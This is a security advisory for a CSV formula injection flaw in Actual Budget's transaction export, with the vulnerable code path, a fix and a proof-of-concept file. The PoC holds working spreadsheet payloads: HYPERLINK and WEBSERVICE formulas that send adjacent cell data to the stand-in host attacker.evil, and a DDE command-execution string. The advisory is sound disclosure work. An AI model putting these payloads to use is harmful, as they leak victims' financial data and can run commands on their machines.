# [M] @actual-app/web has CSV Formula Injection in Transaction Export via Imported Payee/Notes Fields

## Summary
Severity: Medium
Advisory: GHSA-xqjm-27pc-rvwm
CVE: CVE-2026-50179
CWE: CWE-1236
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-22
Source: https://github.com/advisories/GHSA-xqjm-27pc-rvwm
Type: github-advisory

## Affected
- npm: `@actual-app/web` — affected >=0 <26.6.0

## Details
## Summary

`exportToCSV` and `exportQueryToCSV` in `packages/loot-core/src/server/transactions/export/export-to-csv.ts` pass user-controlled `Payee`, `Notes`, `Account`, and `Category` strings to `csv-stringify` with no `cast` callback and no formula-prefix neutralization. Strings that begin with `=`, `+`, `-`, `@`, tab, or carriage return survive verbatim into the exported CSV. When the victim (or anyone they share the export with) opens the file in Excel, LibreOffice Calc, or Google Sheets, the strings are interpreted as formulas. `=HYPERLINK("http://attacker/?leak="&B2,"Bank refund")` is the most reliable variant: it renders as a clickable link with benign text and exfiltrates adjacent cells (transaction amount, account name, payee, balance) on click, with no security prompt in modern Excel/Sheets. `=WEBSERVICE`/`=IMPORTXML` provide auto-firing exfil in some configurations; legacy DDE may achieve RCE on older Excel.

## Details

Sink — `packages/loot-core/src/server/transactions/export/export-to-csv.ts:56`:

```ts
return csvStringify(transactionsForExport, { header: true });
```

and the same call again at `export-to-csv.ts:131` for `exportQueryToCSV`. `csv-stringify` v6 does not neutralize formula-trigger characters by default; only quote/comma/CRLF escaping is applied. There is no shared wrapper — `grep` for `csvStringify` finds exactly one source file across the monorepo.

Source of attacker-controlled `Payee`/`Notes`:

- `packages/loot-core/src/server/transactions/import/parse-file.ts:77` dispatches uploaded files to `parseCSV` (`:109`), `parseOFX` (`:200`), `parseQIF` (`:158`), `parseCAMT` (`:250`). None of them strip or escape formula prefixes from `payee_name`/`imported_payee`/`notes`.
- For OFX, `mapOfxTransaction` in `packages/loot-core/src/server/transactions/import/ofx2json.ts` only runs `html2Plain` (HTML entity decoding) on the NAME field — `=`, `+`, `-`, `@`, `\t` are untouched.
- `sync.normalizeTransactions` (`packages/loot-core/src/server/transactions/sync.ts`) applies `title()` casing, which only mutates letters via `String.toLowerCase`; non-letter prefix characters are preserved, and Excel formulas are case-insensitive (`=hyperlink(...)` parses identically to `=HYPERLINK(...)`).
- The payee can also be entered directly through the UI or set via the `@actual-app/api`'s payee/transaction CRUD endpoints — anyone with write access to a shared budget can plant the payload.

Verification that `csv-stringify` does not neutralize formulas:

```
$ node -e "const{stringify}=require('csv-stringify/sync');console.log(stringify([{Payee:'=HYPERLINK(\"http://x/?\"&B2,\"refund\")'}],{header:true}))"
Payee
"=HYPERLINK(""http://x/?""&B2,""refund"")"
```

The double-quote escaping is intact, but the leading `=` is not prefixed with `'` or otherwise neutralized — Excel, LibreOffice Calc, and Google Sheets will all evaluate this as a formula on open.

## PoC

1. Attacker delivers a malicious file the victim is willing to import (fake bank OFX statement, shared budget file, expense-tracking CSV from a collaborator). Example malicious CSV the victim drops into "Import file":

```
Date,Payee,Amount
2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&B2&C2,""Bank refund details"")",100.00
2026-01-02,"@SUM(1+1)*cmd|'/c calc'!A0",50.00
2026-01-03,"+1+1",-25.00
2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&B2)",10.00
```

2. Victim imports through Account → Import file. `parseFile` (`parse-file.ts:77`) → `parseCSV`/`parseOFX`/`parseQIF`/`parseCAMT` returns rows with the formula strings preserved as `payee_name`. `sync.normalizeTransactions` does not strip the prefix characters.
3. Payees are persisted into the `payees` table verbatim.
4. Some time later the victim runs Account → menu → Export. `transactions-export-query` invokes `exportQueryToCSV` (`export-to-csv.ts:131`).
5. The exported file looks like (verified output shape from `csvStringify`):

```
Account,Date,Payee,Notes,Category_Group,Category,Amount,Split_Amount,Cleared
Checking,2026-01-01,"=HYPERLINK(""http://attacker.evil/leak?d=""&B2&C2,""Bank refund details"")",,,,100.00,0,Not cleared
Checking,2026-01-02,@SUM(1+1)*cmd|'/c calc'!A0,,,,50.00,0,Not cleared
Checking,2026-01-03,+1+1,,,,-25.00,0,Not cleared
Checking,2026-01-04,"=WEBSERVICE(""http://attacker.evil/?d=""&B2)",,,,10.00,0,Not cleared
```

6. Victim or downstream recipient (accountant, spouse, tax preparer) opens the CSV in Excel/LibreOffice/Sheets. `=HYPERLINK(...)` renders as a clickable link that exfiltrates adjacent cell values to attacker on click; `=WEBSERVICE`/`=IMPORTXML` (Sheets/LibreOffice) fire automatically; legacy `=cmd|...` DDE may execute on unpatched Excel.

## Impact

- **Confidentiality**: Adjacent transaction data (amounts, account names, balances, payees, categories) can be exfiltrated to attacker-controlled URLs through `=HYPERLINK` clicks or auto-firing `=WEBSERVICE`/`=IMPORTXML`.
- **Integrity**: Spreadsheet recipients (accountants, tax preparers) see attacker-chosen display values where they expected raw payee names, enabling fraud (e.g., forged "Refund" line items linking to phishing).
- **Reach**: Exports from Actual Budget are commonly shared with third parties (accountants, tax software, household members). One malicious imported statement contaminates every future export of that budget.
- **Note on AC:H**: requires victim-driven import → export → spreadsheet open. Modern Excel disables DDE by default, narrowing the RCE pathway, but `=HYPERLINK` exfil is universal and silent.

## Recommended Fix

Pass a `cast.string` callback to `csv-stringify` that prefixes any formula-trigger string with a single quote, the OWASP-recommended neutralization. Apply at both call sites in `packages/loot-core/src/server/transactions/export/export-to-csv.ts`:

```ts
import { stringify as csvStringify } from 'csv-stringify/sync';

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

function neutralizeFormula(value: string): string {
  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

const csvOptions = {
  header: true,
  cast: {
    string: (value: string) => neutralizeFormula(value),
  },
} as const;

// export-to-csv.ts:56
return csvStringify(transactionsForExport, csvOptions);

// export-to-csv.ts:131
return csvStringify(transactionsForExport, csvOptions);
```

Alternative defenses to consider in addition:
- Strip/neutralize formula prefixes on import in `parse-file.ts` for `payee_name`/`notes` so the database never contains formula-shaped strings (defense in depth — protects any future export consumers).
- Add a regression unit test that asserts every CSV cell starting with `=`, `+`, `-`, `@`, `\t`, or `\r` is prefixed with `'`.

## References
- https://github.com/actualbudget/actual/security/advisories/GHSA-xqjm-27pc-rvwm
- https://github.com/actualbudget/actual
